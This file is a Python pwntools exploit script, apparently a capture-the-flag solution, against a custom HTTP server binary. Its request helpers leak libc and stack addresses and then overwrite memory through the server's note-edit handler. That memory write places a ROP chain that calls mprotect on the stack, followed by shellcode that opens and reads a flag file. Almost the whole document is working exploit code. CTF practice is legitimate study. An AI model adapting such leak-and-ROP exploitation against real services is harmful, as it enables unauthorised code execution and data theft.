#!/usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './httpd'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

debug = 0
if debug:
    io = process('./httpd')
else:
    io = remote('0.0.0.0',10086)

elf = ELF('./httpd')
libc = ELF('./libc.so.6')
one_gadgets = [0x4e880, 0x104d6a, 0x104d72, 0x104d77]

def p(script = '0'):
    if script == '0':
        gdb.attach(io)
        pause()
    else:
        gdb.attach(io, script)

leak = lambda name, address: log.success("{} --> {}".format(name, hex(address)))

def init():
    io.sendline(b"GET /init")
    io.sendline(b"Stdout: 3")
    io.sendline()
    rand = process('./get_randon')
    value = rand.recv(13)
    rand.close()
    return value

def setlocale():
    io.sendline(b"GET /setlocale?=en_US.UTF-8")
    io.sendline(b"Stdout: 3")
    io.sendline()

def reg(username, uid, size):
    size = str(int(str(size), 10))
    payload = f"GET /register?username={username}&password=b&uid={uid}&len={size}"
    io.sendline(payload.encode())
    io.sendline(b"Stdout: 3")
    io.sendline()

def logoff(username, password):
    payload = f"GET /logoff?username={username}&password={password}"
    io.sendline(payload.encode())
    io.sendline(b"Stdout: 3")
    io.sendline()

def show(username, password, fd):
    payload = f"GET /show?username={username}&password={password}"
    io.sendline(payload.encode())
    io.sendline(b"Stdout: " + str(fd).encode())
    io.sendline()

def edit(username, password, content, size):
    payload = f"POST /note?username={username}&password={password}"
    io.sendline(payload.encode())
    io.sendline(b"Content-Length: " + size )
    io.sendline(b"Stdout: 3")
    io.sendline()
    warning("sending edit")
    pause()
    io.send(content)

passwd = init()
pause()
logoff("root", passwd.decode())
pause()
passwd = init()
pause()
show('root', passwd.decode(), 2)
libc.address = u64(io.recvuntil(b'\x7f')[-6:] + b'\x00' *2) - 0x1f6ce0
leak("libc", libc.address)

setlocale()
reg("a:b:0", "1000", 0x20)
reg("b:b:0", "1000", 0xa0)
reg("c:b:0", "1000", 0x200)
pause()

payload = b"a:b:0   :b"
payload = p64(libc.symbols['__environ'])
warning("modifying b")
pause()
edit('b', 'b', payload, b'8')
pause()
show('b', 'b', 1)
stack = u64(io.recvuntil(b'\x7f')[-6:] + b'\x00' *2)
leak("stack", stack)

warning("modifying c")
pause()
edit('c', 'b', p64(stack - 0xca0), b'8')

rdi = libc.address + 0x240e5
rsi = libc.address + 0x2573e
rdx = libc.address + 0x26302
rax = libc.address + 0x40123
ret = libc.address + 0x23159
mprotect = libc.sym['mprotect']

payload = flat(
    rdi, (stack >>16) << 16, rsi, 0x10000, rdx, 7, mprotect, stack - 0xca0 + 0x40
)
payload += asm(shellcraft.connect("0.0.0.0", 0) 
               + shellcraft.open("/flag") 
               + shellcraft.read(2, stack + 0x1000, 0x100) 
               + shellcraft.write(1, stack+0x1000, 0x100)
              )

warning("modifying stack")
leak("set bp at rdi", rdi)
pause()
edit('c', 'b', payload + b'\n', b'512' )


io.interactive()
